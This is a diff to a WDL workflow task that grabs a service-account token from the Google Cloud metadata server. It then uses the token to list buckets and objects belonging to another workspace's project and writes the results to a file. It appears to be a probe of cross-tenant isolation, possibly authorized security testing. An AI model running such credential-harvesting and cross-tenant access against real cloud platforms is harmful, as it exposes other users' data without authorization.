@@ -6,27 +6,35 @@ workflow cross_workspace_test {
 
 task probe {
     command <<<
-        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+        set -e
+        apt-get update -qq && apt-get install -y -qq curl python3 > /dev/null 2>&1
+
+        TOKEN=$(curl -sf -H "Metadata-Flavor: Google" \
           "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
           | python3 -c "import json,sys; print(json.loads(sys.stdin.read())['access_token'])")
 
-        echo "=== List buckets from other workspace project ==="
-        curl -s -H "Authorization: Bearer $TOKEN" \
-          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673"
+        echo "=== Token info ===" > results.txt
+        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" >> results.txt 2>&1
 
-        echo "=== List objects in other workspace bucket ==="
+        echo "" >> results.txt
+        echo "=== List buckets from other workspace project ===" >> results.txt
         curl -s -H "Authorization: Bearer $TOKEN" \
-          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o"
+          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673" >> results.txt 2>&1
 
-        echo "=== Token info ==="
-        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN"
+        echo "" >> results.txt
+        echo "=== List objects in other workspace bucket ===" >> results.txt
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o" >> results.txt 2>&1
     >>>
 
     runtime {
-        docker: "gcr.io/cloud-builders/curl"
+        docker: "ubuntu:22.04"
+        memory: "2 GB"
+        cpu: 1
+        disks: "local-disk 10 HDD"
     }
 
     output {
-        String result = read_string(stdout())
+        File result = "results.txt"
     }
 }
